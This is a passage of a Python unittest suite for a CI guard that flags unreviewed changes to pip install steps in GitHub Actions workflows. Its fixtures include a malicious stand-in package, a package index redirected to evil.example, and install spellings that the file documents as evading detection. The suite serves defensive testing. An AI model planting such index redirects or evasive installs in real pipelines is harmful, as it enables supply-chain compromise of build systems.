            by_ctx[f"{WF}::jobs.build::name:New install"]["reason"].startswith("TODO")
        )
        # an un-reviewed regenerated baseline cannot pass verification
        self.repo.write_manifest(manifest)
        self.assertRed("MANIFEST_ERROR")

    def test_update_resets_review_fields_when_behavior_changes(self):
        # a changed authorization needs a fresh human reason, not the old one
        self.repo.replace(
            WF, "pip install python-magic\n", "pip install python-magic evil\n"
        )
        manifest = guard.build_manifest(
            self.repo.root, existing=self.repo.load_manifest_json()
        )
        by_ctx = {e["context"]: e for e in manifest["entries"]}
        for key in ("reason", "owner", "remediation_issue"):
            self.assertTrue(by_ctx[CTX_MAGIC][key].startswith("TODO"), key)
        # unchanged contexts keep their reviewed fields
        self.assertEqual(by_ctx[CTX_DEPS]["reason"], "fixture authorization")
        self.assertEqual(by_ctx[CTX_ACTION]["owner"], "@fixture")
        # so a regenerated baseline cannot silently re-authorize the change
        self.repo.write_manifest(manifest)
        self.assertRed("MANIFEST_ERROR")

    def test_update_resets_review_fields_when_only_env_changes(self):
        self.repo.replace(
            WF,
            "      - id: magic\n",
            "      - id: magic\n        env:\n          PIP_INDEX_URL: https://evil.example/simple\n",
        )
        manifest = guard.build_manifest(
            self.repo.root, existing=self.repo.load_manifest_json()
        )
        by_ctx = {e["context"]: e for e in manifest["entries"]}
        self.assertTrue(by_ctx[CTX_MAGIC]["reason"].startswith("TODO"))

    def test_update_drops_stale_entries(self):
        self.repo.remove(ACTION)
        manifest = guard.build_manifest(
            self.repo.root, existing=self.repo.load_manifest_json()
        )
        self.assertNotIn(CTX_ACTION, {e["context"] for e in manifest["entries"]})

    def test_update_refuses_on_structural_errors(self):
        self.repo.write(".github/workflows/bad.yml", "jobs: [unclosed\n")
        with self.assertRaises(guard.GuardError):
            guard.build_manifest(
                self.repo.root, existing=self.repo.load_manifest_json()
            )

    def test_cli_exit_codes(self):
        def run(*args):
            return subprocess.run(
                [
                    sys.executable,
                    str(GUARD_SCRIPT),
                    "--repo-root",
                    str(self.repo.root),
                    *args,
                ],
                capture_output=True,
                check=False,
                text=True,
            )

        ok = run()
        self.assertEqual(ok.returncode, 0, ok.stdout + ok.stderr)
        self.assertIn("PASS", ok.stdout)
        self.repo.replace(
            WF, "pip install python-magic\n", "pip install python-magic evil\n"
        )
        red = run()
        self.assertEqual(red.returncode, 1, red.stdout + red.stderr)
        self.assertIn("CHANGED_BLOCK", red.stdout)
        self.assertIn("expected sha256", red.stdout)
        self.assertIn("actual sha256", red.stdout)
        self.assertIn("+pip install python-magic evil", red.stdout)
        # verification never rewrites the manifest
        before = self.repo.manifest_path.read_bytes()
        run()
        self.assertEqual(before, self.repo.manifest_path.read_bytes())

    def test_cli_update_baseline_writes_reviewable_placeholders(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - name: New install\n        run: pip install foo\n      - name: Lint\n",
        )
        upd = subprocess.run(
            [
                sys.executable,
                str(GUARD_SCRIPT),
                "--repo-root",
                str(self.repo.root),
                "--update-baseline",
            ],
            capture_output=True,
            check=False,
            text=True,
        )
        self.assertEqual(upd.returncode, 0, upd.stdout + upd.stderr)
        after = subprocess.run(
            [sys.executable, str(GUARD_SCRIPT), "--repo-root", str(self.repo.root)],
            capture_output=True,
            check=False,
            text=True,
        )
        self.assertEqual(after.returncode, 1, after.stdout)
        self.assertIn("TODO", after.stdout)


# ---------------------------------------------------------------- E. DETECTOR
class DetectorTests(unittest.TestCase):
    RELEVANT: ClassVar[dict[str, str]] = {
        "36 pip": "pip install foo",
        "36 quoted pip": "'pip' install foo",
        "36 double-quoted pip": '"pip" install foo',
        "36 pip variable": "$PIP install foo",
        "36 uppercase": "PIP INSTALL foo",
        "37 pip3": "pip3 install foo",
        "37 pip3.X": "pip3.11 install foo",
        "38 python -m pip": "python -m pip install foo",
        "38 python3 -m pip": "python3 -m pip install foo",
        "38 python3.11 -m pip": "python3.11 -m pip install foo",
        "38 pip global option": "pip -q install foo",
        "39 requirements": "cat apps/api/requirements.txt",
        "40 .whl": "curl -O https://x/y.whl",
        "41 uv pip": "uv pip install foo",
        "41 uv sync": "uv sync --frozen",
        "41 uv add": "uv add foo",
        "42 poetry install": "poetry install",
        "42 poetry add": "poetry add foo",
        "43 conda install": "conda install foo",
        "ensurepip": "python -m ensurepip",
        "easy_install": "easy_install foo",
        "pipx": "pipx install foo",
        "pipenv": "pipenv install",
        "PIP_ env via GITHUB_ENV": 'echo "PIP_INDEX_URL=https://x" >> "$GITHUB_ENV"',
        "UV_ env": "export UV_INDEX_URL=https://x",
        "PYTHONPATH": "export PYTHONPATH=/tmp",
        "later line": "set -euo pipefail\necho hi\npip install foo\n",
        # deterministic, accepted false positives
        "FP pip-audit": "pip-audit -r apps/api/requirements.txt",
        "FP apt python3-pip": "sudo apt-get install -y python3-pip",
        "FP word requirements": "echo 'see requirements'",
    }
    IRRELEVANT: ClassVar[dict[str, str]] = {
        "pipefail": "set -euo pipefail",
        "pipeline word": "echo pipeline",
        "npm": "npm ci && npm run build",
        "apt": "sudo apt-get install -y jq",
        "pnpm install": "pnpm install --frozen-lockfile",
        "guard script name": "python .github/scripts/install_drift_guard.py",
        # documented residual risk: split/computed spellings evade static detection
        "LIMITATION split token": "p''ip install foo",
        "LIMITATION escaped token": "p\\ip install foo",
        "LIMITATION computed": "$(printf 'p%sp' i) install foo",
    }

    def test_relevant_indicators(self):
        for label, text in self.RELEVANT.items():
            with self.subTest(case=label):
                self.assertTrue(guard.is_relevant(text), text)

    def test_irrelevant_and_documented_limitations(self):
        for label, text in self.IRRELEVANT.items():
            with self.subTest(case=label):
                self.assertFalse(guard.is_relevant(text), text)

    def test_limitation_documented_in_guard(self):
        doc = (guard.__doc__ or "").lower()
        self.assertIn("drift detector", doc)
        self.assertIn("not a malicious-author security boundary", doc)
        self.assertIn("obfuscated", doc)


# ---------------------------------------------------------------- canonical digest
class DigestTests(unittest.TestCase):
    def test_canonical_json_and_sha256(self):
        behavior = {
            "run": "pip install é\n",
            "shell": None,
            "working_directory": "a",
            "env": {"PIP_B": "2", "PIP_A": "1"},
        }
        canonical = guard.canonical_json(behavior)
        self.assertEqual(
            canonical,
            '{"env":{"PIP_A":"1","PIP_B":"2"},"run":"pip install é\\n","shell":null,"working_directory":"a"}',
        )
        import hashlib

        self.assertEqual(
            guard.behavior_digest(behavior),
            hashlib.sha256(canonical.encode("utf-8")).hexdigest(),
        )


# ---------------------------------------------------------------- F. SELF PROTECTION / real repository
class RealRepositoryTests(unittest.TestCase):
    def test_current_repository_green(self):
        findings = guard.verify(REPO_ROOT)
        self.assertEqual(findings, [], "\n".join(map(str, findings)))

    def test_committed_manifest_is_regeneration_stable(self):
        manifest_path = REPO_ROOT / guard.MANIFEST_REL
        existing = json.loads(manifest_path.read_bytes().decode("utf-8"))
        regenerated = guard.render_manifest(
            guard.build_manifest(REPO_ROOT, existing=existing)
        )
        self.assertEqual(regenerated, manifest_path.read_bytes().decode("utf-8"))

    def test_44_45_guard_bootstrap_is_a_baselined_block(self):
        self.assertTrue(guard.is_relevant(BOOTSTRAP_RUN))
        manifest = json.loads(
            (REPO_ROOT / guard.MANIFEST_REL).read_bytes().decode("utf-8")
        )
        wf_rel = GUARD_WORKFLOW.relative_to(REPO_ROOT).as_posix()
        entries = [e for e in manifest["entries"] if e["file"] == wf_rel]
        self.assertEqual(len(entries), 1, entries)
        self.assertEqual(entries[0]["behavior"]["run"].rstrip("\n"), BOOTSTRAP_RUN)
        self.assertEqual(GUARD_REQUIREMENTS.read_bytes(), b"PyYAML==6.0.3\n")

    def test_guard_has_no_special_case_for_its_own_workflow(self):
        source = GUARD_SCRIPT.read_text(encoding="utf-8")
        self.assertNotIn("install-drift-guard.yml", source)
        self.assertNotIn("requirements-pip-install-guard", source)

    def test_46_workflow_runs_on_every_pull_request(self):
        wf = guard.load_yaml(GUARD_WORKFLOW.read_bytes().decode("utf-8"))
        triggers = wf[True] if True in wf else wf["on"]  # YAML 1.1 reads `on` as True
        self.assertIn("pull_request", triggers)
        pr = triggers["pull_request"] or {}
        for key in ("paths", "paths-ignore", "branches", "branches-ignore"):
            self.assertNotIn(key, pr)
        push = triggers["push"]
        self.assertNotIn("paths", push)
        self.assertEqual(sorted(push["branches"]), ["develop", "main"])

    def test_workflow_least_privilege_and_pins(self):
        wf = guard.load_yaml(GUARD_WORKFLOW.read_bytes().decode("utf-8"))
        self.assertEqual(wf["permissions"], {"contents": "read"})
        for job in wf["jobs"].values():
            self.assertNotIn("permissions", job)
            uses = [s["uses"] for s in job["steps"] if "uses" in s]
            self.assertIn(
                "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", uses
            )
            self.assertIn(
                "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", uses
            )
            for ref in uses:
                self.assertRegex(ref, r"@[0-9a-f]{40}$")
            runs = [s.get("run", "") for s in job["steps"]]
            self.assertTrue(any("test_install_drift_guard.py" in r for r in runs))
            self.assertTrue(
                any(
                    "install_drift_guard.py" in r and "--update-baseline" not in r
                    for r in runs
                )
            )
            self.assertFalse(any("--update-baseline" in r for r in runs))

    def test_no_broad_exception_handlers(self):
        tree = ast.parse(GUARD_SCRIPT.read_text(encoding="utf-8"))
        allowed = {
            "OSError",
            "UnicodeDecodeError",
            "YAMLError",
            "ValueError",
            "TypeError",
            "_SchemaError",
            "GuardError",
        }
        for node in ast.walk(tree):
            if isinstance(node, ast.ExceptHandler):
                self.assertIsNotNone(node.type, "bare except")
                names = {
                    n.attr if isinstance(n, ast.Attribute) else getattr(n, "id", "")
                    for n in (
                        node.type.elts
                        if isinstance(node.type, ast.Tuple)
                        else [node.type]
                    )
                }
                self.assertTrue(names <= allowed, names)


# ---------------------------------------------------------------- G. LINE ENDINGS
class LineEndingTests(unittest.TestCase):
    def _behavior(self, raw):
        repo = FixtureRepo({WF: raw})
        self.addCleanup(repo.cleanup)
        blocks, findings = guard.collect_blocks(repo.root)
        self.assertEqual(findings, [])
        return {b.context: b.behavior for b in blocks}[CTX_MAGIC]

    def test_47_lf_and_crlf_parse_to_identical_behavior(self):
        multi = APP_WORKFLOW.replace(
            "          pip install python-magic\n",
            "          pip install \\\n            python-magic\n          echo ok\n",
        )
        lf = multi.encode("utf-8")
        crlf = multi.replace("\n", "\r\n").encode("utf-8")
        self.assertIn(b"\r\n", crlf)
        b_lf, b_crlf = self._behavior(lf), self._behavior(crlf)
        self.assertEqual(b_lf["run"], "pip install \\\n  python-magic\necho ok\n")
        self.assertNotIn(
            "\r", b_crlf["run"]
        )  # YAML parsing folds CRLF line breaks to LF
        self.assertEqual(b_lf, b_crlf)
        self.assertEqual(guard.behavior_digest(b_lf), guard.behavior_digest(b_crlf))

    def test_47b_escaped_carriage_return_is_content(self):
        quoted = APP_WORKFLOW.replace(
            "        run: |\n          pip install python-magic\n",
            '        run: "pip install python-magic\\r"\n',
        )
        plain = APP_WORKFLOW.replace(
            "        run: |\n          pip install python-magic\n",
            '        run: "pip install python-magic"\n',
        )
        b_cr, b_plain = self._behavior(quoted.encode()), self._behavior(plain.encode())
        self.assertEqual(b_cr["run"], "pip install python-magic\r")
        self.assertNotEqual(guard.behavior_digest(b_cr), guard.behavior_digest(b_plain))


if __name__ == "__main__":
    unittest.main()
